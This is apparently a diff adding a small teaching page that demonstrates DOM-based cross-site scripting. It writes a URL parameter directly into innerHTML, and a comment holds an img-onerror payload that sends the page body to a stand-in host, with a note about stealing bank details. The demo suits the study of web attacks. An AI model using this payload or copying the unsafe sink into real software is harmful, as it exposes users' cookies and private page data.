@@ -1,0 +1,27 @@
+<html>
+    <body>
+        <div>
+            <!-- Vulnerable code -->
+            Welcome, <span id="username"></span>
+        </div>
+        <script>
+            function setCookie(name, value, days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days*24*60*60) );
+                const expires = "expires="+date.toUTCString();
+                document.cookie = name + "=" + value + ";" + expires; 
+                console.log(document.cookie)
+            }
+            setCookie("exampleCookie", "Hello cookie", 4);
+
+            const params = new URLSearchParams(window.location.search)
+            const name = params.get('name')
+            document.getElementById('username').innerHTML = name;
+        </script>
+    </body>
+</html>
+
+<!-- <img src=\"empty.jpg\" onerror=\"var mycookie = document.cookie; new Image().src=`http://example.com/fakepage.php?output=${document.body.innerHTML}`;\"/> -->
+
+<!-- we are sending the entire pahtml page to other wesite  so all contents in DOM can be accessed it might contain critical information
+like bank details etc..-->
